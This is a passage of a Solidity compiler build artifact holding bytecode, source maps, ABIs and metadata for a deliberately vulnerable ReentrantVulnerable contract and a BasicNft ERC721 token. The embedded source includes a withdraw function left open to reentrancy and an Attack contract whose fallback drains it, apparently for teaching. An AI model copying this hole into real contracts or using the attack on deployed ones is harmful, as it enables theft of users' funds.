0x0 SWAP2 POP SWAP1 POP SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP PUSH1 0x0 DUP2 GT PUSH2 0x13D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH1 0x40 MLOAD PUSH2 0x163 SWAP1 PUSH2 0x2DB JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x1A0 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x1A5 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x1E9 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1E0 SWAP1 PUSH2 0x2F0 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP POP JUMP JUMPDEST CALLVALUE PUSH1 0x0 DUP1 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD PUSH2 0x23B SWAP2 SWAP1 PUSH2 0x347 JUMP JUMPDEST SWAP3 POP POP DUP2 SWAP1 SSTORE POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x253 DUP2 PUSH2 0x439 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x26F JUMPI PUSH2 0x26E PUSH2 0x408 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x27D DUP5 DUP3 DUP6 ADD PUSH2 0x244 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x293 PUSH1 0x15 DUP4 PUSH2 0x336 JUMP JUMPDEST SWAP2 POP PUSH2 0x29E DUP3 PUSH2 0x40D JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2B6 PUSH1 0x0 DUP4 PUSH2 0x32B JUMP JUMPDEST SWAP2 POP PUSH2 0x2C1 DUP3 PUSH2 0x436 JUMP JUMPDEST PUSH1 0x0 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2D5 DUP2 PUSH2 0x3CF JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2E6 DUP3 PUSH2 0x2A9 JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x309 DUP2 PUSH2 0x286 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x325 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x2CC JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x352 DUP3 PUSH2 0x3CF JUMP JUMPDEST SWAP2 POP PUSH2 0x35D DUP4 PUSH2 0x3CF JUMP JUMPDEST SWAP3 POP DUP3 PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF SUB DUP3 GT ISZERO PUSH2 0x392 JUMPI PUSH2 0x391 PUSH2 0x3D9 JUMP JUMPDEST JUMPDEST DUP3 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3A8 DUP3 PUSH2 0x3AF JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH32 0x4661696C656420746F2073656E64206574686572200000000000000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST POP JUMP JUMPDEST PUSH2 0x442 DUP2 PUSH2 0x39D JUMP JUMPDEST DUP2 EQ PUSH2 0x44D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 MSTORE8 INVALID CREATE2 PUSH31 0x5312456AF446CE256F26830C4E6ABB69B9173533DE926402BC8F9C3B64736F PUSH13 0x63430008070033000000000000 ","sourceMap":"57:489:12:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;447:97;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;92:43;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;232:209;;;;;;;;;;;;;:::i;:::-;;142:84;;;:::i;:::-;;447:97;490:7;516:21;509:28;;447:97;:::o;92:43::-;;;;;;;;;;;;;;;;;:::o;232:209::-;269:11;283:8;:20;292:10;283:20;;;;;;;;;;;;;;;;269:34;;327:1;321:3;:7;313:16;;;;;;340:9;355:10;:15;;378:3;355:31;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;339:47;;;404:4;396:38;;;;;;;;;;;;:::i;:::-;;;;;;;;;259:182;;232:209::o;142:84::-;210:9;186:8;:20;195:10;186:20;;;;;;;;;;;;;;;;:33;;;;;;;:::i;:::-;;;;;;;;142:84::o;7:139:15:-;53:5;91:6;78:20;69:29;;107:33;134:5;107:33;:::i;:::-;7:139;;;;:::o;152:329::-;211:6;260:2;248:9;239:7;235:23;231:32;228:119;;;266:79;;:::i;:::-;228:119;386:1;411:53;456:7;447:6;436:9;432:22;411:53;:::i;:::-;401:63;;357:117;152:329;;;;:::o;487:366::-;629:3;650:67;714:2;709:3;650:67;:::i;:::-;643:74;;726:93;815:3;726:93;:::i;:::-;844:2;839:3;835:12;828:19;;487:366;;;:::o;859:398::-;1018:3;1039:83;1120:1;1115:3;1039:83;:::i;:::-;1032:90;;1131:93;1220:3;1131:93;:::i;:::-;1249:1;1244:3;1240:11;1233:18;;859:398;;;:::o;1263:118::-;1350:24;1368:5;1350:24;:::i;:::-;1345:3;1338:37;1263:118;;:::o;1387:379::-;1571:3;1593:147;1736:3;1593:147;:::i;:::-;1586:154;;1757:3;1750:10;;1387:379;;;:::o;1772:419::-;1938:4;1976:2;1965:9;1961:18;1953:26;;2025:9;2019:4;2015:20;2011:1;2000:9;1996:17;1989:47;2053:131;2179:4;2053:131;:::i;:::-;2045:139;;1772:419;;;:::o;2197:222::-;2290:4;2328:2;2317:9;2313:18;2305:26;;2341:71;2409:1;2398:9;2394:17;2385:6;2341:71;:::i;:::-;2197:222;;;;:::o;2506:147::-;2607:11;2644:3;2629:18;;2506:147;;;;:::o;2659:169::-;2743:11;2777:6;2772:3;2765:19;2817:4;2812:3;2808:14;2793:29;;2659:169;;;;:::o;2834:305::-;2874:3;2893:20;2911:1;2893:20;:::i;:::-;2888:25;;2927:20;2945:1;2927:20;:::i;:::-;2922:25;;3081:1;3013:66;3009:74;3006:1;3003:81;3000:107;;;3087:18;;:::i;:::-;3000:107;3131:1;3128;3124:9;3117:16;;2834:305;;;;:::o;3145:96::-;3182:7;3211:24;3229:5;3211:24;:::i;:::-;3200:35;;3145:96;;;:::o;3247:126::-;3284:7;3324:42;3317:5;3313:54;3302:65;;3247:126;;;:::o;3379:77::-;3416:7;3445:5;3434:16;;3379:77;;;:::o;3462:180::-;3510:77;3507:1;3500:88;3607:4;3604:1;3597:15;3631:4;3628:1;3621:15;3771:117;3880:1;3877;3870:12;3894:171;4034:23;4030:1;4022:6;4018:14;4011:47;3894:171;:::o;4071:114::-;;:::o;4191:122::-;4264:24;4282:5;4264:24;:::i;:::-;4257:5;4254:35;4244:63;;4303:1;4300;4293:12;4244:63;4191:122;:::o"},"gasEstimates":{"creation":{"codeDepositCost":"231600","executionCost":"275","totalCost":"231875"},"external":{"balances(address)":"2814","deposit()":"infinite","getBalance()":"317","withdraw()":"infinite"}},"methodIdentifiers":{"balances(address)":"27e235e3","deposit()":"d0e30db0","getBalance()":"12065fe0","withdraw()":"3ccfd60b"}},"metadata":"{\"compiler\":{\"version\":\"0.8.7+commit.e28d00a7\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balances\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"deposit\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/sub/ReentrantVulnerable.sol\":\"ReentrantVulnerable\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/sub/ReentrantVulnerable.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.7;\\n\\ncontract ReentrantVulnerable {\\n    mapping(address => uint256) public balances;\\n\\n    function deposit() public payable {\\n        balances[msg.sender] += msg.value;\\n    }\\n\\n    function withdraw() public {\\n        uint256 bal = balances[msg.sender];\\n        require(bal > 0);\\n        (bool sent, ) = msg.sender.call{value: bal}(\\\"\\\");\\n        require(sent, \\\"Failed to send ether \\\");\\n    }\\n\\n    function getBalance() public view returns (uint256) {\\n        return address(this).balance;\\n    }\\n}\\n\\ncontract Attack {\\n    ReentrantVulnerable public reentrantVulnerable;\\n\\n    constructor(address _reentrantVulnerable) {\\n        reentrantVulnerable = ReentrantVulnerable(_reentrantVulnerable);\\n    }\\n\\n    fallback() external payable {\\n        if (address(reentrantVulnerable).balance >= 1 ether) {\\n            reentrantVulnerable.withdraw();\\n        }\\n    }\\n\\n    receive() external payable {\\n        revert(\\\"i got no idea\\\");\\n    }\\n\\n    function attack() external payable {\\n        require(msg.value >= 1 ether);\\n        reentrantVulnerable.deposit{value: 1 ether}();\\n        reentrantVulnerable.withdraw();\\n    }\\n\\n    function getBalance() public view returns (uint256) {\\n        return address(this).balance;\\n    }\\n}\\n\",\"keccak256\":\"0x73197c33597719032434130163d3e9d1689ebbac2bdd3d632215faf32ddd78e9\",\"license\":\"MIT\"}},\"version\":1}","storageLayout":{"storage":[{"astId":3061,"contract":"contracts/sub/ReentrantVulnerable.sol:ReentrantVulnerable","label":"balances","offset":0,"slot":"0","type":"t_mapping(t_address,t_uint256)"}],"types":{"t_address":{"encoding":"inplace","label":"address","numberOfBytes":"20"},"t_mapping(t_address,t_uint256)":{"encoding":"mapping","key":"t_address","label":"mapping(address => uint256)","numberOfBytes":"32","value":"t_uint256"},"t_uint256":{"encoding":"inplace","label":"uint256","numberOfBytes":"32"}}},"userdoc":{"kind":"user","methods":{},"version":1}}},"contracts/test/BasicNft.sol":{"BasicNft":{"abi":[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"approved","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"operator","type":"address"},{"indexed":false,"internalType":"bool","name":"approved","type":"bool"}],"name":"ApprovalForAll","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"DogMinted","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[],"name":"TOKEN_URI","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"approve","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"getApproved","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getTokenCounter","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"operator","type":"address"}],"name":"isApprovedForAll","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"mintNft","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"ownerOf","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"safeTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"bytes","name":"data","type":"bytes"}],"name":"safeTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"operator","type":"address"},{"internalType":"bool","name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"bytes4","name":"interfaceId","type":"bytes4"}],"name":"supportsInterface","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"tokenURI","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"transferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"}],"devdoc":{"kind":"dev","methods":{"approve(address,uint256)":{"details":"See {IERC721-approve}."},"balanceOf(address)":{"details":"See {IERC721-balanceOf}."},"getApproved(uint256)":{"details":"See {IERC721-getApproved}."},"isApprovedForAll(address,address)":{"details":"See {IERC721-isApprovedForAll}."},"name()":{"details":"See {IERC721Metadata-name}."},"ownerOf(uint256)":{"details":"See {IERC721-ownerOf}."},"safeTransferFrom(address,address,uint256)":{"details":"See {IERC721-safeTransferFrom}."},"safeTransferFrom(address,address,uint256,bytes)":{"details":"See {IERC721-safeTransferFrom}."},"setApprovalForAll(address,bool)":{"details":"See {IERC721-setApprovalForAll}."},"supportsInterface(bytes4)":{"details":"See {IERC165-supportsInterface}."},"symbol()":{"details":"See {IERC721Metadata-symbol}."},"tokenURI(uint256)":{"details":"See {IERC721Metadata-tokenURI}."},"transferFrom(address,address,uint256)":{"details":"See {IERC721-transferFrom}."}},"version":1},"evm":{"bytecode":{"functionDebugData":{"@_116":{"entryPoint":null,"id":116,"parameterSlots":2,"returnSlots":0},"@_3221":{"entryPoint":null,"id":3221,"parameterSlots":0,"returnSlots":0},"extract_byte_array_length":{"entryPoint":368,"id":null,"parameterSlots":1,"returnSlots":1},"panic_error_0x22":{"entryPoint":422,"id":null,"parameterSlots":0,"returnSlots":0}},"generatedSources":[{"ast":{"nodeType":"YulBlock","src":"0:516:15","statements":[{"body":{"nodeType":"YulBlock","src":"58:269:15","statements":[{"nodeType":"YulAssignment","src":"68:22:15","value":{"arguments":[{"name":"data","nodeType":"YulIdentifier","src":"82:4:15"},{"kind":"number","nodeType":"YulLiteral","src":"88:1:15","type":"","value":"2"}],"functionName":{"name":"div","nodeType":"YulIdentifier","src":"78:3:15"},"nodeType":"YulFunctionCall","src":"78:12:15"},"variableNames":[{"name":"length","nodeType":"YulIdentifier","src":"68:6:15"}]},{"nodeType":"YulVariableDeclaration","src":"99:38:15","value":{"arguments":[{"name":"data","nodeType":"YulIdentifier","src":"129:4:15"},{"kind":"number","nodeType":"YulLiteral","src":"135:1:15","type":"","value":"1"}],"functionName":{"name":"and","nodeType":"YulIdentifier","src":"125:3:15"},"nodeType":"YulFunctionCall","src":"125:12:15"},"variables":[{"name":"outOfPlaceEncoding","nodeType":"YulTypedName","src":"103:18:15","type":""}]},{"body":{"nodeType":"YulBlock","src":"176:51:15","statements":[{"nodeType":"YulAssignment","src":"190:27:15","value":{"arguments":[{"name":"length","nodeType":"YulIdentifier","src":"204:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"212:4:15","type":"","value":"0x7f"}],"functionName":{"name":"and","nodeType":"YulIdentifier","src":"200:3:15"},"nodeType":"YulFunctionCall","src":"200:17:15"},"variableNames":[{"name":"length","nodeType":"YulIdentifier","src":"190:6:15"}]}]},"condition":{"arguments":[{"name":"outOfPlaceEncoding","nodeType":"YulIdentifier","src":"156:18:15"}],"functionName":{"name":"iszero","nodeType":"YulIdentifier","src":"149:6:15"},"nodeType":"YulFunctionCall","src":"149:26:15"},"nodeType":"YulIf","src":"146:81:15"},{"body":{"nodeType":"YulBlock","src":"279:42:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"panic_error_0x22","nodeType":"YulIdentifier","src":"293:16:15"},"nodeType":"YulFunctionCall","src":"293:18:15"},"nodeType":"YulExpressionStatement","src":"293:18:15"}]},"condition":{"arguments":[{"name":"outOfPlaceEncoding","nodeType":"YulIdentifier","src":"243:18:15"},{"arguments":[{"name":"length","nodeType":"YulIdentifier","src":"266:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"274:2:15","type":"","value":"32"}],"functionName":{"name":"lt","nodeType":"YulIdentifier","src":"263:2:15"},"nodeType":"YulFunctionCall","src":"263:14:15"}],"functionName":{"name":"eq","nodeType":"YulIdentifier","src":"240:2:15"},"nodeType":"YulFunctionCall","src":"240:38:15"},"nodeType":"YulIf","src":"237:84:15"}]},"name":"extract_byte_array_length","nodeType":"YulFunctionDefinition","parameters":[{"name":"data","nodeType":"YulTypedName","src":"42:4:15","type":""}],"returnVariables":[{"name":"length","nodeType":"YulTypedName","src":"51:6:15","type":""}],"src":"7:320:15"},{"body":{"nodeType":"YulBlock","src":"361:152:15","statements":[{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"378:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"381:77:15","type":"","value":"35408467139433450592217433187231851964531694900788300625387963629091585785856"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"371:6:15"},"nodeType":"YulFunctionCall","src":"371:88:15"},"nodeType":"YulExpressionStatement","src":"371:88:15"},{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"475:1:15","type":"","value":"4"},{"kind":"number","nodeType":"YulLiteral","src":"478:4:15","type":"","value":"0x22"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"468:6:15"},"nodeType":"YulFunctionCall","src":"468:15:15"},"nodeType":"YulExpressionStatement","src":"468:15:15"},{"expression":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"499:1:15","type":"","value":"0"},{"kind":"number","nodeType":"YulLiteral","src":"502:4:15","type":"","value":"0x24"}],"functionName":{"name":"revert","nodeType":"YulIdentifier","src":"492:6:15"},"nodeType":"YulFunctionCall","src":"492:15:15"},"nodeType":"YulExpressionStatement","src":"492:15:15"}]},"name":"panic_error_0x22","nodeType":"YulFunctionDefinition","src":"333:180:15"}]},"contents":"{\n\n    function extract_byte_array_length(data) -> length {\n        length := div(data, 2)\n        let outOfPlaceEncoding := and(data, 1)\n        if iszero(outOfPlaceEncoding) {\n            length := and(length, 0x7f)\n        }\n\n        if eq(outOfPlaceEncoding, lt(length, 32)) {\n            panic_error_0x22()\n        }\n    }\n\n    function panic_error_0x22() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x22)\n        revert(0, 0x24)\n    }\n\n}\n","id":15,"language":"Yul","name":"#utility.yul"}],"linkReferences":{},"object":"60806040523480156200001157600080fd5b506040518060400160405280600581526020017f446f6769650000000000000000000000000000000000000000000000000000008152506040518060400160405280600381526020017f444f470000000000000000000000000000000000000000000000000000000000815250816000908051906020019062000096929190620000c0565b508060019080519060200190620000af929190620000c0565b5050506000600681905550620001d5565b828054620000ce9062000170565b90600052602060002090601f016020900481019282620000f257600085556200013e565b82601f106200010d57805160ff19168380011785556200013e565b828001600101855582156200013e579182015b828111156200013d57825182559160200191906001019062000120565b5b5090506200014d919062000151565b5090565b5b808211156200016c57600081600090555060010162000152565b5090565b600060028204905060018216806200018957607f821691505b60208210811415620001a0576200019f620001a6565b5b50919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b61259a80620001e56000396000f3fe608060405234801561001057600080fd5b50600436106101005760003560e01c806370a0823111610097578063b88d4fde11610066578063b88d4fde146102ad578063c2229fea146102c9578063c87b56dd146102d3578063e985e9c51461030357610100565b806370a082311461022557806378ce90351461025557806395d89b4114610273578063a22cb4651461029157610100565b806323b872dd116100d357806323b872dd1461019f57806342842e0e146101bb5780636352211e146101d75780636e02007d1461020757610100565b806301ffc9a71461010557806306fdde0314610135578063081812fc14610153578063095ea7b314610183575b600080fd5b61011f600480360381019061011a91906119a9565b610333565b60405161012c9190611cda565b60405180910390f35b61013d610415565b60405161014a9190611cf5565b60405180910390f35b61016d60048036038101906101689190611a03565b6104a7565b60405161017a9190611c73565b60405180910390f35b61019d60048036038101906101989190611969565b6104ed565b005b6101b960048036038101906101b49190611853565b610605565b005b6101d560048036038101906101d09190611853565b610665565b005b6101f160048036038101906101ec9190611a03565b610685565b6040516101fe9190611c73565b60405180910390f35b61020f61070c565b60405161021c9190611e97565b60405180910390f35b61023f600480360381019061023a91906117e6565b610716565b60405161024c9190611e97565b60405180910390f35b61025d6107ce565b60405161026a9190611cf5565b60405180910390f35b61027b6107ea565b6040516102889190611cf5565b60405180910390f35b6102ab60048036038101906102a69190611929565b61087c565b005b6102c760048036038101906102c291906118a6565b610892565b005b6102d16108f4565b005b6102ed60048036038101906102e89190611a03565b610946565b6040516102fa9190611cf5565b60405180910390f35b61031d60048036038101906103189190611813565b6109b0565b60405161032a9190611cda565b60405180910390f35b60007f80ac58cd000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916827bffffffffffffffffffffffffffffffffffffffffffffffffffffffff191614806103fe57507f5b5e139f000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916827bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916145b8061040e575061040d82610a44565b5b9050919050565b60606000805461042490612080565b80601f016020809104026020016040519081016040528092919081815260200182805461045090612080565b801561049d5780601f106104725761010080835404028352916020019161049d565b820191906000526020600020905b81548152906001019060200180831161048057829003601f168201915b5050505050905090565b60006104b282610aae565b6004600083815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050919050565b60006104f882610685565b90508073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610569576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161056090611e37565b60405180910390fd5b8073ffffffffffffffffffffffffffffffffffffffff16610588610af9565b73ffffffffffffffffffffffffffffffffffffffff1614806105b757506105b6816105b1610af9565b6109b0565b5b6105f6576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016105ed90611e57565b60405180910390fd5b6106008383610b01565b505050565b610616610610610af9565b82610bba565b610655576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161064c90611d17565b60405180910390fd5b610660838383610c4f565b505050565b61068083838360405180602001604052806000815250610892565b505050565b60008061069183610f49565b9050600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff161415610703576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016106fa90611e17565b60405180910390fd5b80915050919050565b6000600654905090565b60008073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610787576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161077e90611dd7565b60405180910390fd5b600360008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b60405180608001604052806057815260200161250e6057913981565b6060600180546107f990612080565b80601f016020809104026020016040519081016040528092919081815260200182805461082590612080565b80156108725780601f1061084757610100808354040283529160200191610872565b820191906000526020600020905b81548152906001019060200180831161085557829003601f168201915b5050505050905090565b61088e610887610af9565b8383610f86565b5050565b6108a361089d610af9565b83610bba565b6108e2576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016108d990611d17565b60405180910390fd5b6108ee848484846110f3565b50505050565b6109003360065461114f565b6006547fef1da42f89c42f48befa143007e6f5efd84a2d1cc3dc97c5edd2d3373220f66d60405160405180910390a2600160065461093e9190611f40565b600681905550565b60606109518261116d565b610990576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161098790611e77565b60405180910390fd5b60405180608001604052806057815260200161250e605791399050919050565b6000600560008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16905092915050565b60007f01ffc9a7000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916827bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916149050919050565b610ab78161116d565b610af6576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610aed90611e17565b60405180910390fd5b50565b600033905090565b816004600083815260200190815260200160002060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550808273ffffffffffffffffffffffffffffffffffffffff16610b7483610685565b73ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b92560405160405180910390a45050565b600080610bc683610685565b90508073ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff161480610c085750610c0781856109b0565b5b80610c4657508373ffffffffffffffffffffffffffffffffffffffff16610c2e846104a7565b73ffffffffffffffffffffffffffffffffffffffff16145b91505092915050565b8273ffffffffffffffffffffffffffffffffffffffff16610c6f82610685565b73ffffffffffffffffffffffffffffffffffffffff1614610cc557